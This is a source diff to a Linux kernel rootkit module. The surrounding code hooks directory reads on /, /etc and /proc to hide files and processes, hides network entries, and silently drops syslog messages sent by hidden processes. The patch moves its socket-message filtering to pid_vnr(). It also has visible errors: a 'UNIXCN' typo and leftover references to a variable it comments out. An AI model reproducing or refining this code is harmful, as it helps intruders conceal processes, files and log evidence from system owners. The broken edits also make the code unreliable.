@@ -14,6 +14,7 @@
 #include <net/tcp.h>		//hide netstat
 #include <linux/socket.h> //clean syslog
 #include <net/af_unix.h>  //UNIXCB
+#include <linux/pid.h>   //pid_vnr()
 #include "my_rootkit.h"
 
 #include <linux/version.h>
@@ -93,7 +94,7 @@ static void k_free_list(struct list_head *root)
 //hide files
 //hack /
 LIST_HEAD(hide_files);
-char *root_fs = "/";    
+static char *root_fs = "/";    
 struct super_block *root_sb[1024];
 readdir_t orig_root_readdir = NULL;
 filldir_t orig_root_filldir = NULL;
@@ -135,7 +136,7 @@ static int my_root_readdir(struct file *fp, void *buf, filldir_t filldir)
 	return r;
 }
 //hack /etc
-char *etc_fs = "/etc";  
+static char *etc_fs = "/etc";  
 struct super_block *etc_sb[1024];  
 readdir_t orig_etc_readdir = NULL;
 filldir_t orig_etc_filldir = NULL;
@@ -177,7 +178,7 @@ static int my_etc_readdir(struct file *fp, void *buf, filldir_t filldir)
 //hide processes
 //hack /proc 
 LIST_HEAD(hide_processes);
-char *proc_fs = "/proc";
+static char *proc_fs = "/proc";
 readdir_t orig_proc_readdir = NULL;
 filldir_t orig_proc_filldir = NULL;
 spinlock_t proc_filldir_lock;
@@ -428,7 +429,8 @@ static int my_unix_stream_recvmsg(struct kiocb *iocb, struct socket *sock, struc
 	struct sock *sk = NULL;
 	struct sk_buff *skb = NULL;
 	int err = 0;
-	struct ucred creds = {0};	
+	//struct ucred creds = {0};	
+	pid_t pid = -1; // replace creds by pid
 	int find = -1, i = 0;
 
 	if (!msg || !sock) goto out;
@@ -458,9 +460,11 @@ static int my_unix_stream_recvmsg(struct kiocb *iocb, struct socket *sock, struc
 			goto out;
 		}
 		unix_state_unlock(sk);
-		cred_real_to_ucred(UNIXCB(skb).pid, UNIXCB(skb).cred, &creds);
+		//cred_real_to_ucred(UNIXCB(skb).pid, UNIXCB(skb).cred, &creds);
+		pid = pid_vnr(UNIXCN(skb).pid); // replace cred_real_to_ucred by pid_vnr
 		//my_rootkit_debug("In my_unix_stream_recvmsg creds.pid=%d\n", creds.pid);
-		if (1 == (find=process_should_be_hidden(creds.pid))) {
+		//if (1 == (find=process_should_be_hidden(creds.pid))) {
+		if (1 == (find=process_should_be_hidden(pid))) { // replace creds,pid by pid
 			my_rootkit_debug("rsyslogd tcp: process pid is %d\n",creds.pid);
 			skb_dequeue(&sk->sk_receive_queue);
 		}
@@ -475,7 +479,8 @@ static int my_unix_dgram_recvmsg(struct kiocb *kio, struct socket *sock, struct 
 	int noblock = flags & MSG_DONTWAIT;
 	struct sk_buff *skb = NULL;
 	int err;
-	struct ucred creds = {0};
+	//struct ucred creds = {0};
+	pid_t pid = -1; // replace creds by pid
 	int find = -1, i = 0;
 
 	if (!msg || !sock) goto out;
@@ -499,9 +504,11 @@ static int my_unix_dgram_recvmsg(struct kiocb *kio, struct socket *sock, struct 
 	    skb = skb_recv_datagram(sk, flags|MSG_PEEK, noblock, &err);
         if (!skb) goto out;
 		
-		cred_real_to_ucred(UNIXCB(skb).pid, UNIXCB(skb).cred, &creds);
+		//cred_real_to_ucred(UNIXCB(skb).pid, UNIXCB(skb).cred, &creds);
+		pid = pid_vnr(UNIXCB(skb).pid); // replace cred_real_to_ucred by pid_vnr
 		//my_rootkit_debug("In my_unix_dgram_recvmsg creds.pid=%d\n", creds.pid);
-		if (1 == (find=process_should_be_hidden(creds.pid))) {
+		//if (1 == (find=process_should_be_hidden(creds.pid))) {
+		if (1 == (find=process_should_be_hidden(pid))) { // replace creds.pid by pid
 			my_rootkit_debug("rsyslogd udp: process pid is %d\n",creds.pid);
 			skb_dequeue(&sk->sk_receive_queue);
 		}
